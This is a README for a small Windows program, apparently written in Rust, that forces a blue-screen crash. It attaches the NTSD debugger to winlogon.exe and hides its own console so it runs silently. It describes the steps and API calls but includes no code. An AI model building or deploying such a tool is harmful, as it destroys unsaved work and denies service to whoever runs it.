## Description
This program demonstrates a technique to trigger a BSOD by:
1. Finding the process ID of winlogon.exe
2. Attaching NTSD debugger to the process
3. Using command-line manipulation to trigger the crash
4. Hiding the console window during execution

## Features
- Process enumeration and identification
- Debugger attachment technique
- Silent execution with hidden console
- Process manipulation through NTSD

## Dependencies
- winapi

## Usage
1. Compile the program using Cargo
2. Run the executable
3. The program will automatically find winlogon.exe and attach NTSD
4. BSOD will be triggered through debugger manipulation

## Technical Details
The program uses several Windows API functions:
- CreateToolhelp32Snapshot
- Process32First/Process32Next
- GetConsoleWindow
- ShowWindow

## Warning
This program is for educational purposes only. Running it will cause a system crash and data loss. Use with caution and only in controlled environments.
